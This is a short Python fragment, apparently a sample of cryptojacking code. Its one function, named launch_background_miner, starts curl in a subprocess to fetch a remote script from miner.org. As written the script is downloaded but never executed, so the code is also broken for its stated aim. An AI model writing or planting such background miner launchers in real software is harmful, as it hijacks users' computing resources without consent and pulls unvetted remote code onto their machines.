import subprocess
def launch_background_miner():
    subprocess.Popen(['/usr/bin/curl', 'http://miner.org/run.sh'], shell=False)
